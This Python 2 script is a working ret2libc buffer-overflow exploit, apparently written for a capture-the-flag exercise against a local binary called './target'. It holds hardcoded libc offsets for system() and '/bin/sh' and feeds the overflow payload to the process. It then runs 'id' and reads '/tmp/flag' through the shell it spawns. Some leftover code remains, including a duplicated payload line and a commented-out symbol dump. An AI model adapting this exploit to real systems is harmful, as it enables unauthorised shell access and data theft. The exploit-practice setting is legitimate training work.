#!/usr/bin/env python2

import struct
import subprocess as sp
from pwn import *

padding = 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaac'

LIBC_BASE  = 0xf7de5000
ADDR_SYS   = LIBC_BASE + 0x0003d200
ADDR_BUF   = 0xffffd394
ADDR_RET   = 0xffffd358
ADDR_BINSH = LIBC_BASE + 0x001730cf
addr_binsh_rop = 0x001730cf # ropper --file /lib/i386-linux-gnu/libc.so.6 --string /bin/sh

def writeToFile(payload):
    # Write shellcode to a binary
    f = open('shellcode', 'w')
    f.write(payload)
    f.close()

def p32(n):
    return struct.pack("<I", n)

def get_payload():
    payload = 'A'*(ADDR_BUF - ADDR_RET) + p32(ADDR_SYS) + "\n"
    payload = 'A'*len(padding) + p32(ADDR_SYS) + "\n"
    return payload

if __name__ == '__main__':

    '''
    binary = ELF("./target")
    libc = ELF("./libc.so.6")
    sysAddr = libc.symbols['system']
    setvbufAddr = libc.symbols['setvbuf']
    printfAddr = libc.symbols['printf']
    putsAddr = libc.symbols['puts']
    gotAddr = libc.symbols['.got.plt']
    baseAddr = 0x56555000
    libcBaseAddr = 0xf7de5000
    print 'system(): 0x%x'  % (libcBaseAddr + sysAddr)
    print 'setvbuf(): 0x%x'  % (libcBaseAddr + setvbufAddr)
    print 'printf(): 0x%x'  % (libcBaseAddr + printfAddr)
    print 'puts(): 0x%x'  % (libcBaseAddr + putsAddr)
    print 'got(): 0x%x'  % (libcBaseAddr + gotAddr)
    
    exit()
    '''
    p = sp.Popen("./target", stdin=sp.PIPE, stdout=sp.PIPE)
    print(p.stdout.readline())

    payload = get_payload() + p32(ADDR_BINSH) + p32(ADDR_BINSH) + "\n"
    writeToFile(payload)
    p.stdin.write(payload)
    p.stdin.write("/usr/bin/id\n")
    p.stdin.write("/bin/cat /tmp/flag\n")
    #p.stdin.write(p32(ADDR_BINSH) + "/bin/cat /tmp/flag\n")
    #p.stdin.write(p32(ADDR_BINSH) + "\n")
    while True:
        l = p.stdout.readline()
        l = l.strip()
        if l == "":
            break
        print(l)
    p.terminate()
